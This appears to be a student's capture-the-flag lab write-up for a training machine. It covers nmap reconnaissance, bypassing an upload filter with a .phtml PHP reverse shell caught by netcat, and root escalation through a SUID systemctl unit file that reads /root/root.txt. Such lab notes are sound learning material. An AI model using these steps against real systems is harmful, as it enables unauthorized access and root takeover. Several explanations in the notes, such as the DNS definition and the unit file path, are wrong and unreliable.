@@ -1,0 +1,105 @@
+IP:10.10.214.13
+
+[Task 2] Reconnaissance 
+
+nmap -sV -sC -oN nmap/initial (IP ADDRESS)
+
+DNS (Domain Name Server) resolution is the process of translating IP addresses to domain names.
+
+port taken can access to it by pasting it behind the ip address 
+
+10.10.214.13 = 10.10.214.13:3333 
+
+
+
+.php
+.php3
+.php4
+,php5
+.phtml
+
+
+
+gain access by submitting a php reverse shell with the correct format which is phtml format 
+
+then nc -nlvp to listen to the shell u sent to gain access to the server
+
+
+
+systemctl is used to examine and control the state of “systemd” system and service manager. 
+The tasks are known as units (Google.exe , word.txt , python.py), and each unit has a corresponding unit file.
+We can create our own unit (csgo.exe)file and let systemd start it
+
+Normally systemctl will look for unit files in the default folder, which is /etc/system/systemd. But we don’t have the permission to write to that folder. So how can we create an unit file and let systemctl start it? We use an enviroment(Global/general like in c outside the program) variable.
+
+
+ sudo openvpn /path-to-file/file-name.ovpn &
+
+
+//Linux Environment Variable 
+
+
+An echo service simply sends back to the originating source any data it receives
+
+ExecStart = allows you to specify any command that you'd like to run when this unit is started.
+
+
+/bin/systemctl
+
+Systemctl is a controlling interface and inspection tool for the widely-adopted init system and service manager systemd. Systemd in turn is an init system and system manager that is widely becoming the new standard for Linux machines. So what can we do with systemctl?
+
+Systemd initializes user space components that run after the Linux kernel has booted, as well as continuously maintaining those components throughout a system’s lifecycle. These tasks are known as units, and each unit has a corresponding unit file. We can create our own unit file and let systemd start it. Normally systemctl will look for unit files in the default folder, which is /etc/system/systemd. But we don’t have the permission to write to that folder. So how can we create an unit file and let systemctl start it? We use an enviroment variable.
+
+First we create a variable which holds a unique file.
+1
+	
+$ eop=$(mktemp).service
+
+Then we create an unit file and write it into the variable.
+
+$ echo '[Service]
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+> [Install]
+> WantedBy=multi-user.target' > $eop
+
+Inside the unit file we entered a command which will let shell execute the command cat and redirect the output of cat to a file called output in the folder tmp. And finally we use the /bin/systemctl program to enable the unit file.
+1
+2
+3
+4
+	
+$ /bin/systemctl link $eop
+Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
+$ /bin/systemctl enable --now $eop
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
+
+Let’s see if it worked….
+
+$ ls -lah /tmp
+total 40K
+drwxrwxrwt  8 root     root     4.0K Sep 11 08:02 .
+drwxr-xr-x 23 root     root     4.0K Jul 31 18:29 ..
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .ICE-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .Test-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .X11-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .XIM-unix
+drwxrwxrwt  2 root     root     4.0K Sep 11 06:43 .font-unix
+-rw-r--r--  1 root     root       33 Sep 11 08:02 output
+drwx------  3 root     root     4.0K Sep 11 06:43 systemd-private-08e99713731549f5bfffde65043f0c88-systemd-timesyncd.service-5k0yVW
+-rw-------  1 www-data www-data    0 Sep 11 07:58 tmp.x1uzp01alO
+-rw-rw-rw-  1 www-data www-data  103 Sep 11 07:59 tmp.x1uzp01alO.service
+
+There is a file called output.
+	
+$ cat /tmp/output
+a58ff8579f0a9270368d???????????
+
+And there you have it. The output of root.txt. To not give away the final flag, I left out most of the hash so you need to get it yourself.
+
+
+
+
+
+
+
+
